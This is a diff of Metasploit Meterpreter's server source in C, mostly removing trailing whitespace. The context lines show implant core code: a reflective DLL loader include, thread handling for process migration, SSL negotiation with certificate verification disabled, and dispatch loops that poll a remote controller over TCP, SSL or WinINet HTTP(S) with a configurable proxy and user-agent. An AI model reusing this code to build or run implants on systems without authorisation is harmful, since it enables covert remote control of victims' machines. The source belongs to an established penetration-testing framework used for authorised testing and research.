@@ -16,15 +16,15 @@ int global_comm_timeout       = 0xaf79257f;
 
 #ifdef _WIN32
 
-#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
-#include <excpt.h> 
+#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION
+#include <excpt.h>
 
 // NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor
 
 // include the Reflectiveloader() function
 #include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
-int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep) 
+int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
 {
 	return EXCEPTION_EXECUTE_HANDLER;
 }
@@ -76,7 +76,7 @@ static VOID server_locking_callback(int mode, int type, const char * file, int l
  * @returns The current thread ID.
  * @remarks While not needed on windows this must be used for posix meterpreter.
  */
-static DWORD server_threadid_callback(VOID)
+static long unsigned int server_threadid_callback(VOID)
 {
 #ifdef _WIN32
 	return GetCurrentThreadId();
@@ -182,7 +182,7 @@ static LONG server_socket_poll( Remote * remote, long timeout )
 
 	result = select((int)fd + 1, &fdread, NULL, NULL, &tv );
 
-#ifndef _WIN32 
+#ifndef _WIN32
 	// Handle EAGAIN, etc.
 	if(result == -1) {
 		if(errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) {
@@ -225,7 +225,7 @@ static BOOL server_initialize_ssl( Remote * remote )
 	CRYPTO_set_locking_callback( server_locking_callback );
 	CRYPTO_set_dynlock_create_callback( server_dynamiclock_create );
 	CRYPTO_set_dynlock_lock_callback( server_dynamiclock_lock );
-	CRYPTO_set_dynlock_destroy_callback( server_dynamiclock_destroy  ); 
+	CRYPTO_set_dynlock_destroy_callback( server_dynamiclock_destroy  );
 
 	lock_release( remote->lock );
 
@@ -247,7 +247,7 @@ static BOOL server_destroy_ssl( Remote * remote )
 	lock_acquire( remote->lock );
 
 	SSL_free( remote->ssl );
-	
+
 	SSL_CTX_free( remote->ctx );
 
 	CRYPTO_set_locking_callback( NULL );
@@ -258,7 +258,7 @@ static BOOL server_destroy_ssl( Remote * remote )
 
 	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
 		lock_destroy( ssl_locks[i] );
-		
+
 	free( ssl_locks );
 
 	lock_release( remote->lock );
@@ -288,14 +288,14 @@ static BOOL server_negotiate_ssl(Remote *remote)
 
 		remote->ssl  = SSL_new(remote->ctx);
 		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
-		    
+
 		if( SSL_set_fd(remote->ssl, (int)remote->fd) == 0 )
 		{
 			dprintf("[SERVER] set fd failed");
 			success = FALSE;
 			break;
 		}
-		
+
 		do {
 			if( (ret = SSL_connect(remote->ssl)) != 1 )
 			{
@@ -311,7 +311,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
 				break;
 			}
 		} while(ret != 1);
-		
+
 		if (success == FALSE) break;
 
 		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
@@ -326,7 +326,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
 	lock_release( remote->lock );
 
 	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
-	
+
 	if( ret < 0 )
 		success = FALSE;
 
@@ -393,7 +393,7 @@ static DWORD server_dispatch(Remote * remote)
 	return result;
 }
 
-#ifdef _WIN32 
+#ifdef _WIN32
 /*
  * The servers main dispatch loop for incoming requests using SSL over TCP
  */
@@ -409,15 +409,15 @@ static DWORD server_dispatch_http_wininet( Remote * remote )
 	char tmpHostName[512];
 	char tmpUrlPath[1024];
 
-	if (global_expiration_timeout > 0) 
+	if (global_expiration_timeout > 0)
 		remote->expiration_time  = current_unix_timestamp() + global_expiration_timeout;
 	else
 		remote->expiration_time = 0;
-	
+
 	remote->comm_timeout     = global_comm_timeout;
 	remote->start_time       = current_unix_timestamp();
 	remote->comm_last_packet = current_unix_timestamp();
-	
+
 	// Allocate the top-level handle
 	if (!strcmp(global_meterpreter_proxy,"METERPRETER_PROXY")) {
 		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -430,7 +430,7 @@ static DWORD server_dispatch_http_wininet( Remote * remote )
 	}
 	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);
 
-	
+
 	// The InternetCrackUrl method was poorly designed...
 	memset(tmpHostName, 0, sizeof(tmpHostName));
 	memset(tmpUrlPath, 0, sizeof(tmpUrlPath));
@@ -494,14 +494,14 @@ static DWORD server_dispatch_http_wininet( Remote * remote )
 		if( result != ERROR_SUCCESS ) {
 
 			// Update the timestamp for empty replies
-			if (result == ERROR_EMPTY) 
+			if (result == ERROR_EMPTY)
 				remote->comm_last_packet = current_unix_timestamp();
 
 			if (ecount < 10)
 				delay = 10 * ecount;
-			else 
+			else
 				delay = 100 * ecount;
-			
+
 			ecount++;
 
 			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
@@ -535,7 +535,7 @@ static DWORD server_dispatch_http_wininet( Remote * remote )
 	return result;
 }
 
-#endif 
+#endif
 
 /*
  * Get the session id that this meterpreter server is running in.
@@ -596,13 +596,13 @@ DWORD server_setup( SOCKET fd )
 	InitAppInstance();
 
 	srand( (unsigned int)time(NULL) );
-	
-	__try 
+
+	__try
 	{
 		do
 		{
 			dprintf( "[SERVER] module loaded at 0x%08X", hAppInstance );
-			
+
 			// Open a THREAD item for the servers main thread, we use this to manage migration later.
 			serverThread = thread_open();
 
@@ -661,7 +661,7 @@ DWORD server_setup( SOCKET fd )
 			if (remote->transport == METERPRETER_TRANSPORT_SSL) {
 				dprintf("[SERVER] Flushing the socket handle...");
 				server_socket_flush( remote );
-		
+
 				dprintf("[SERVER] Initializing SSL...");
 				if( !server_initialize_ssl( remote ) )
 					break;
@@ -675,7 +675,7 @@ DWORD server_setup( SOCKET fd )
 
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", remote->transport);
 				server_dispatch( remote );
-		
+
 				dprintf("[SERVER] Deregistering dispatch routines...");
 				deregister_dispatch_routines( remote );
 			}
@@ -683,13 +683,13 @@ DWORD server_setup( SOCKET fd )
 			if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS) {
 				dprintf("[SERVER] Registering dispatch routines...");
 				register_dispatch_routines();
-				
+
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", remote->transport);
 #ifdef _WIN32
 				server_dispatch_http_wininet( remote );
 #else
 				// XXX: Handle non-windows HTTP transport
-#endif 
+#endif
 
 				dprintf("[SERVER] Deregistering dispatch routines...");
 				deregister_dispatch_routines( remote );
@@ -705,7 +705,7 @@ DWORD server_setup( SOCKET fd )
 		if( remote )
 			remote_deallocate( remote );
 
-	} 
+	}
 	__except( exceptionfilter(GetExceptionCode(), GetExceptionInformation()) )
 	{
 		dprintf("[SERVER] *** exception triggered!");
